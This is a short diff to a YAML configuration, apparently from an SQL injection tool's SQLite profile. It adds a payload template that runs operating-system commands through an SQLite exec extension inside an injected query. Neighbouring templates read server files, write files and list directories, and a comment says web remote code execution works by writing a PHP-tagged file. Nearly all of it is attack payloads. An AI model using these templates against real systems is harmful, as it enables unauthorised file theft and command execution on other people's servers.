@@ -129,12 +129,10 @@ resource:
   extension:
     # fileioRead: select c from (select fileio_read('%s')) ${limit}
     fileioRead: "select '${enclose_value_sql}'|| fileio_read('%s') || '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}' ${limit}"
+    exec: select '${enclose_value_sql}'|| exec('%s') || '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}' ${limit}
     # documentation only, unused
     fileioWrite: fileio_write('%s', '%s')
     fileioLs: select name from fileio_ls('%s') ${limit}
-    # lin exec.so missing
-    # win exec.dll => sqlite3.loadextension: Not supported in multithreaded Web servers
-    exec: select exec('pwd', 'UTF8')
     
   # Web RCE working fine despite the file embedded in sqlite format as tag '<?php ?>' is interpreted
   writeFile: |
